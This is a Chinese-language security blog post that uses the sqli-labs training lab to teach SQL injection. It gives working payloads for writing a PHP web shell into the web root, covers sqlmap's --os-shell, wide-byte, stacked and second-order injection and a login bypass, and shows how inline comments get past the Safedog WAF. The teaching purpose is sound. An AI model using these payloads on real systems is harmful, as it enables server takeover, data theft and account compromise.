<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="SQL注入其他方法"><meta name="keywords" content="Web"><meta name="author" content="wickt42"><meta name="copyright" content="wickt42"><title>SQL注入其他方法 | Wickt42's Tech Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '7.3.0'
} </script><meta name="generator" content="Hexo 7.3.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1%E3%80%81%E4%BD%BF%E7%94%A8%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E7%9A%84%E6%96%B9%E5%BC%8F%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.</span> <span class="toc-text">1、使用手工注入的方式写入一句话木马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E5%86%B3%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.0.1.</span> <span class="toc-text">先决条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.0.2.</span> <span class="toc-text">具体实现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2%E3%80%81%E4%BD%BF%E7%94%A8%E4%B8%80%E4%B8%8Bsqlmap%E5%B7%A5%E5%85%B7%E7%9A%84%E2%80%93os-shell%E9%80%89%E9%A1%B9"><span class="toc-number">2.</span> <span class="toc-text">2、使用一下sqlmap工具的–os-shell选项</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3%E3%80%81%E4%BD%BF%E7%94%A8sqlmap%E5%B7%A5%E5%85%B7%E6%9F%A5%E7%9C%8Bsecurity%E6%95%B0%E6%8D%AE%E5%BA%93users%E8%A1%A8%E7%9A%84%E6%89%80%E6%9C%89%E5%AD%97%E6%AE%B5"><span class="toc-number">3.</span> <span class="toc-text">3、使用sqlmap工具查看security数据库users表的所有字段</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4%E3%80%81%E6%BC%94%E7%A4%BA%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%EF%BC%8C%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%EF%BC%8C%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%EF%BC%8C%E8%A7%A3%E9%87%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86"><span class="toc-number">4.</span> <span class="toc-text">4、演示宽字节注入，堆叠注入，二次注入，万能密码，解释相关原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">4.1.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">4.2.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">4.3.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">4.4.</span> <span class="toc-text">万能密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90"><span class="toc-number">4.4.1.</span> <span class="toc-text">代码解析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5%E3%80%81%E5%B0%9D%E8%AF%95%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E7%9A%84%E9%99%90%E5%88%B6%EF%BC%8C%E6%B3%A8%E5%85%A5%E5%87%BA%E6%9D%A5security%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%87%A0%E5%BC%A0%E8%A1%A8%E5%90%8D%E7%A7%B0"><span class="toc-number">5.</span> <span class="toc-text">5、尝试手动绕过安全狗的限制，注入出来security数据库的几张表名称</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A5-sqli-labs-Less-1-%E4%B8%BA%E4%BE%8B"><span class="toc-number">5.1.</span> <span class="toc-text">以 sqli-labs&#x2F;Less-1 为例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E6%89%BE%E5%87%BA%E8%A7%A6%E5%8F%91%E5%AD%97%E6%AE%B5"><span class="toc-number">5.1.1.</span> <span class="toc-text">尝试找出触发字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87"><span class="toc-number">5.1.2.</span> <span class="toc-text">如何绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A"><span class="toc-number">5.1.2.1.</span> <span class="toc-text">内联注释</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E6%B3%A8%E5%85%A5%E5%87%BA%E5%85%B6%E4%BB%96%E4%BF%A1%E6%81%AF"><span class="toc-number">5.1.3.</span> <span class="toc-text">尝试注入出其他信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF"><span class="toc-number">5.1.3.1.</span> <span class="toc-text">数据库信息</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250729165900674.jpg"></div><div class="author-info__name text-center">wickt42</div><div class="author-info__description text-center">Information Security</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/wickt42/wickt42.github.io">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">34</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">7</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">33</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://github.com/">github</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody">hexo-theme-melody</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250729164955479.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Wickt42's Tech Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/slides">Slides</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">SQL注入其他方法</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2025-08-21</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Web/">Web</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Web/SQL%E6%B3%A8%E5%85%A5%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95/">SQL注入其他方法</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="1、使用手工注入的方式写入一句话木马"><a href="#1、使用手工注入的方式写入一句话木马" class="headerlink" title="1、使用手工注入的方式写入一句话木马"></a>1、使用手工注入的方式写入一句话木马</h1><h3 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h3><p>是否root用户（查看配置文件）、绝对路径、配置文件（secure-file-priv&#x3D;</p>
<h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><p>以sqli-labs的Less-1为例</p>
<p>首先尝试注入测试</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1222</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213556057.png" alt="image-20250821162540389"></p>
<p>尝试写入恶意代码发现报错</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1222</span><span class="string">&#x27; union select 1,&lt;?php system($_GET[&#x27;</span>str<span class="string">&#x27;]); ?&gt;,3 into outfile &#x27;</span>D:<span class="operator">/</span>phpStudy<span class="operator">/</span>WWW<span class="operator">/</span><span class="number">3.</span>php<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213603382.png" alt="image-20250821162738091"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 方法一将<span class="operator">&lt;</span>?php <span class="keyword">system</span>($_GET[&quot;str&quot;]); ?<span class="operator">&gt;</span>做一个十六进制编码</span><br><span class="line">?id<span class="operator">=</span><span class="number">1111</span><span class="string">&#x27; union select 1,0x3c3f7068702073797374656d28245f4745545b27737472275d293b203f3e,3 into outfile &#x27;</span>D:<span class="operator">/</span>phpStudy<span class="operator">/</span>WWW<span class="operator">/</span><span class="number">2.</span>php<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 方法二将恶意代码使用单引号括起来，PHP代码必须用单引号包裹</span></span><br><span class="line"><span class="string">?id=1222&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;&lt;?php system($_GET[&quot;str&quot;]); ?&gt;&#x27;</span>,<span class="number">3</span> <span class="keyword">into</span> outfile <span class="string">&#x27;D:\\phpStudy\\WWW\\3.php&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"># 使用的路径符号不同，Windows路径应使用双反斜杠\\或正斜杠<span class="operator">/</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1222</span><span class="string">&#x27; union select 1,&#x27;</span><span class="operator">&lt;</span>?php <span class="keyword">system</span>($_GET[&quot;str&quot;]); ?<span class="operator">&gt;</span><span class="string">&#x27;,3 into outfile &#x27;</span>D:<span class="operator">/</span>phpStudy<span class="operator">/</span>WWW<span class="operator">/</span><span class="number">4.</span>php<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213603382.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213621493.png" alt="image-20250821163545846"></p>
<p>查看代码</p>
<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213631039.png" alt="image-20250821163610359"></p>
<h1 id="2、使用一下sqlmap工具的–os-shell选项"><a href="#2、使用一下sqlmap工具的–os-shell选项" class="headerlink" title="2、使用一下sqlmap工具的–os-shell选项"></a>2、使用一下sqlmap工具的–os-shell选项</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.142.144/sqli-labs/Less-1/?id=1&quot;</span> --os-shell --fresh-queries</span><br><span class="line"><span class="comment"># -u 指定 url</span></span><br><span class="line"><span class="comment"># --os-shell 特定情况下直接获取目标系统的 shell</span></span><br><span class="line"><span class="comment"># --fresh-queries 不适用缓存</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里手动输入输入木马的路径</span></span><br><span class="line"><span class="comment"># 也可以使用 --writable-dir=&quot;D:/phpStudy/www/&quot; 指定路径</span></span><br><span class="line"><span class="comment"># sqlmap -u &quot;http://192.168.142.144/sqli-labs/Less-1/?id=1&quot; --os-shell --writable-dir=&quot;D:/phpStudy/www/&quot; --fresh-queries </span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213634925.png" alt="image-20250821190917080"></p>
<p>这里成功获取到了shell，测试shell</p>
<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213639714.png" alt="image-20250821191119125"></p>
<h1 id="3、使用sqlmap工具查看security数据库users表的所有字段"><a href="#3、使用sqlmap工具查看security数据库users表的所有字段" class="headerlink" title="3、使用sqlmap工具查看security数据库users表的所有字段"></a>3、使用sqlmap工具查看security数据库users表的所有字段</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.142.144/sqli-labs/Less-1/?id=1&quot;</span> --batch -T<span class="string">&quot;users&quot;</span> --columns --fresh-queries</span><br><span class="line"><span class="comment"># -T&quot;users&quot; 指定表名为 users 表</span></span><br><span class="line"><span class="comment"># --columns 列出所有字段名称</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213648391.png" alt="image-20250821191447877"></p>
<h1 id="4、演示宽字节注入，堆叠注入，二次注入，万能密码，解释相关原理"><a href="#4、演示宽字节注入，堆叠注入，二次注入，万能密码，解释相关原理" class="headerlink" title="4、演示宽字节注入，堆叠注入，二次注入，万能密码，解释相关原理"></a>4、演示宽字节注入，堆叠注入，二次注入，万能密码，解释相关原理</h1><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>利用数据库和应用程序对字符编码处理不一致的漏洞，让转义符失效，使原本被转义的敏感字符（如单引号<code>&#39;</code>）可以正常生效，进而闭合SQL语句完成注入。</p>
<p>首先进行SQL注入尝试，发现单引号<code>&#39;</code>‘被反斜杠<code>\</code>转义</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-32</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213653493.png" alt="image-20250821164154315"></p>
<p>被转义想想办法让反斜杠不进行转义，这时该使用宽字节注入。已知数字1的ascii码表中的十六进制为31，并且ascii码表中只记录了128个字符，每个字符占一个字节并且第一个比特为0。中文字符就占两个字节，那么在反斜杠之前添加一个ascii码大于128的字符写法让其和反斜杠<code>\</code>拼接成一个汉字这样单引号就能正常生效了。（单引号<code>&#39;</code>的ascii十六进制为27，<code>\</code>的ascii十六进制为5c）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="keyword">user</span>(),<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>注入出了当前的数据库用户</p>
<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213704440.png" alt="image-20250821170558181"></p>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>攻击者将含有恶意SQL代码的输入先存入数据库中。之后，当应用程序再次从数据库取出该数据，并未经检查便用于执行新的SQL查询时，触发的注入漏洞。对数据库的数据无条件信任</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-24</span></span><br><span class="line"># 首先我们要向数据库写入恶意代码</span><br><span class="line"># 注册用户 admin<span class="string">&#x27;# （密码1234），单引号是为了在查询语句中与前面的单引号闭合，# 是为了注释后续的语句。</span></span><br><span class="line"><span class="string"># 目的是修改admin用户的密码</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213713422.png" alt="image-20250821192151325"></p>
<p>查看此时数据库 admin 用户和 admin’# 用户的情况</p>
<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213719073.png" alt="image-20250821192328300"></p>
<p>接下来开始修改密码，修改为123456</p>
<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213723486.png" alt="image-20250821192616203"></p>
<p>返回数据库查看密码修改情况，发现 admin 用户的密码被修改了，反而 admin’# 用户的密码没有被修改</p>
<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213727714.png" alt="image-20250821193039275"></p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>攻击者利用分号<code>;</code>在一次数据库查询请求后追加执行额外的SQL语句。堆叠注入可以执行任意SQL语句（如INSERT, UPDATE, DROP等）。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; ;selext 1,2,3--+</span></span><br><span class="line"><span class="string"># 简单堆叠语句尝试，发现页面正常显示结果，说明能够进行堆叠注入</span></span><br><span class="line"><span class="string"># 接下来向数据新插入一个用户</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213735846.png" alt="image-20250821194751048"></p>
<p>查看数据库情况</p>
<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213748537.png" alt="image-20250821194912496"></p>
<p>新加一个用户</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; ;insert into users(id,username,password) value(114,&#x27;</span>student<span class="string">&#x27;,&#x27;</span><span class="number">514</span><span class="string">&#x27;)--+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213756442.png" alt="image-20250821195029202"></p>
<p>再次查看数据库，发现新添加了一个用户</p>
<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213814510.png" alt="image-20250821195049246"></p>
<h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p>通过在登录查询中构造一个永真条件，来绕过用户名和密码验证。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#输入username：</span><br><span class="line"><span class="number">111</span><span class="string">&#x27; or 1=1--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#输入password：</span></span><br><span class="line"><span class="string">1234</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#发现报错，因为引号闭合出问题</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213820418.png" alt="image-20250821195652502"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#输入username：</span><br><span class="line"><span class="number">111</span><span class="string">&#x27; or 1=&#x27;</span><span class="number">1</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">#输入password：</span><br><span class="line"><span class="number">1234</span></span><br><span class="line"># 成功登录上 admin<span class="string">&#x27;# 用户</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213827718.png" alt="image-20250821200135973"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#输入username：</span><br><span class="line"><span class="number">111</span><span class="string">&#x27; or 1=&#x27;</span><span class="number">1</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">#输入password：</span><br><span class="line"><span class="number">123456</span></span><br><span class="line"># 成功登录上 admin 用户</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213833054.png" alt="image-20250821200154478"></p>
<h3 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 传入参数</span></span><br><span class="line"><span class="variable">$uname</span>=-<span class="number">1</span><span class="string">&#x27; or 1=&#x27;</span><span class="number">1</span>--+</span><br><span class="line"><span class="variable">$passwd</span>=<span class="number">1234</span></span><br><span class="line"><span class="comment"># 语句在闭合时变成</span></span><br><span class="line">SELECT username, password</span><br><span class="line">FROM users</span><br><span class="line">WHERE username=<span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="string">&#x27;1-- &#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;1234&#x27;</span></span><br><span class="line">LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#逻辑变为(username=&#x27;-1&#x27; OR 1=&#x27;1-- &#x27;) AND password=&#x27;1234&#x27;，只要 1=&#x27;1-- &#x27; 成立（恒真），仍需 password=&#x27;1234&#x27; 匹配。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#若数据库真有密码为 1234 的记录，就会返回该条用户；否则仍视为“登录失败”，页面输出 mysql_error() 提示。</span></span><br></pre></td></tr></table></figure>



<h1 id="5、尝试手动绕过安全狗的限制，注入出来security数据库的几张表名称"><a href="#5、尝试手动绕过安全狗的限制，注入出来security数据库的几张表名称" class="headerlink" title="5、尝试手动绕过安全狗的限制，注入出来security数据库的几张表名称"></a>5、尝试手动绕过安全狗的限制，注入出来security数据库的几张表名称</h1><h2 id="以-sqli-labs-Less-1-为例"><a href="#以-sqli-labs-Less-1-为例" class="headerlink" title="以 sqli-labs&#x2F;Less-1 为例"></a>以 sqli-labs&#x2F;Less-1 为例</h2><p>首先尝试使用，联合查询</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br><span class="line"><span class="string"># 发现被拦截了，肯定是语句中某个关键词触发了安全狗的规则</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213838011.png" alt="image-20250821201026920"></p>
<h3 id="尝试找出触发字段"><a href="#尝试找出触发字段" class="headerlink" title="尝试找出触发字段"></a>尝试找出触发字段</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213843943.png" alt="image-20250821201323295"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union --+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213848932.png" alt="image-20250821201402392"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1111</span><span class="string">&#x27; select --+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213854032.png" alt="image-20250821203634133"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select --+</span></span><br><span class="line"><span class="string"># 经过对比发现检测关键字为 union select 两个单词的联合</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213859716.png" alt="image-20250821201444680"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 最后测试大小写混写</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union SEleCt --+</span></span><br><span class="line"><span class="string"># 还是失败</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213905893.png" alt="image-20250821201741066"></p>
<h3 id="如何绕过"><a href="#如何绕过" class="headerlink" title="如何绕过"></a>如何绕过</h3><h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><p>内联注释是 MySQL 数据库特有的一种注释语法，其格式为 <code>/*! ... */</code>。它与标准的多行注释 <code>/* ... */</code> 类似。<code>/*!xxxxxxx*/</code> !后面的语句会当作SQL语句直接执行。</p>
<p>还可以指定版本号，注释中的代码只有在 MySQL 服务器版本大于或等于指定版本时才会被执行。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 尝试使用内联注释绕过WAF</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union /*!select*/--+</span></span><br><span class="line"><span class="string"># 但是还是被拦截了，看来简单内联注释还不行</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213913224.png" alt="image-20250821202648428"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; %20UNION%20/*!23456*/SELECT%201,2,3--+</span></span><br><span class="line"><span class="string"># 解码后</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">UNION</span> <span class="comment">/*!23456*/</span><span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"># <span class="operator">%</span><span class="number">20</span> 是空格的 ascii 码的十六进制</span><br><span class="line"># <span class="comment">/*!23456*/</span>目的：将<span class="keyword">UNION</span>和<span class="keyword">SELECT</span>关键词分开，避免被安全设备检测到&quot;UNION SELECT&quot;这个常见的攻击模式</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213918474.png" alt="image-20250821202903075"></p>
<h3 id="尝试注入出其他信息"><a href="#尝试注入出其他信息" class="headerlink" title="尝试注入出其他信息"></a>尝试注入出其他信息</h3><h4 id="数据库信息"><a href="#数据库信息" class="headerlink" title="数据库信息"></a>数据库信息</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1111</span><span class="string">&#x27; UNION /*!23456*/SELECT 1,database/*!23456*/(),3 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 这里尝试过使用 data/*!23456*/base() ，会报错</span></span><br><span class="line"><span class="string"># 原因：根据内联注释的规则，MySQL会执行注释中的代码。但在这个位置，注释是空的（/*!23456*/ 里面没有内容），所以它等价于一个空字符串或被忽略</span></span><br><span class="line"><span class="string"># 所以 data/*!23456*/base() 实际上等于 data base()，服务器识别不出来database() 这个函数，所以会报错</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wickt42/PicGo.img@main/img/20250821213924268.png" alt="image-20250821204120274"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 绕过失败</span><br><span class="line">?id<span class="operator">=</span><span class="number">1111</span><span class="string">&#x27; UNION /*!23456*/SELECT 1,(select group_/*!23456*/concat(table_/*!23456*/name) from information_/*!23456*/schema.tables where table_schema=security),3 --+</span></span><br></pre></td></tr></table></figure>

